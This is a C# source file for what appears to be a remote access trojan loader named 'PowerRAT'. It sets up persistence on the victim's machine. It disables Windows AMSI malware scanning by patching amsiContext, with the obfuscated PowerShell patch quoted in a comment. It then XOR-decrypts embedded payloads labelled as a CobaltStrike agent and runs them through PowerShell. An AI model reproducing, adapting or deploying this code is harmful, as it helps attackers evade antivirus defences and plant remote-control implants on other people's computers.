using System;
using System.Management.Automation;
using System.Collections.ObjectModel;
using System.Text;

namespace PowerRAT
{
    internal class Program
    {
        static string DecodeBase64(string base64Encoded)
        {
            byte[] base64Bytes = Convert.FromBase64String(base64Encoded);
            return Encoding.UTF8.GetString(base64Bytes);
        }

        static string decryptPayload(string xorPayload) {
            byte[] e_cbbbbbbb = Convert.FromBase64String(xorPayload);
            byte[] key = Encoding.UTF8.GetBytes("tak3Th1sShit");
            int keyLength = key.Length;

            for (int i = 0; i < e_cbbbbbbb.Length; i++)
            {
                e_cbbbbbbb[i] ^= key[i % keyLength]; 
            }

            string o_r_ccccccccc = Encoding.UTF8.GetString(e_cbbbbbbb);
            return o_r_ccccccccc;
        }

        static void Main(string[] args){
            //Persistent step ------------------------------------------------------------------------------------------------------------------
            Persistent.Persistent_copy();
            Persistent.Persistent_main();

            //Bypass Amsi by patching AmsiContext-----------------------------------------------------------------------------------------------

            /*Original Powershell patch code
             * 
        $g=([Ref].Assembly.GetTypes() | ForEach-Object{$_.GetFields('NonPublic,Static') | ForEach-Object {$_ | where-object {$_.Name -like "*iContext"}}}).GetValue($null);
        [IntPtr]$ptr=$g;
        [Int32[]]$buf=@(0);
        $t = "S"+"y"+"s"+"t"+"em"+"."+"R"+"u"+"n"+"t"+"i"+"m"+"e"+"."+"I"+"n"+"t"+"e"+"r"+"o"+"p"+"S"+"e"+"r"+"v"+"i"+"c"+"e"+"s"+"."+"M"+"a"+"r"+"s"+"h"+"a"+"l";
        [Type]::GetType($t)::Copy($buf, 0, $ptr, 1);
             */
            PowerShell ps = PowerShell.Create();
            //Collection<PSObject> PSOutput;
            //Console.WriteLine(DecodeBase64(PublicResource.patchAmsiContext));
            ps.AddScript(DecodeBase64(PublicResource.patchAmsiContext)).Invoke();



            //Run CobaltStrike agent-------------------------------------------------------------------------------------------------------------
            //Console.WriteLine(decryptPayload(PublicResource.CBS_get_proc));
            ps.AddScript(decryptPayload(PublicResource.CBS_get_proc)).Invoke();

            //Console.WriteLine(decryptPayload(PublicResource.CBS_get_proc));
            ps.AddScript(decryptPayload(PublicResource.CBS_get_delegate_type)).Invoke();

            //Console.WriteLine(decryptPayload(PublicResource.CBS_get_proc));
            ps.AddScript(decryptPayload(PublicResource.CBS_Invoke)).Invoke();
        }
    }
}
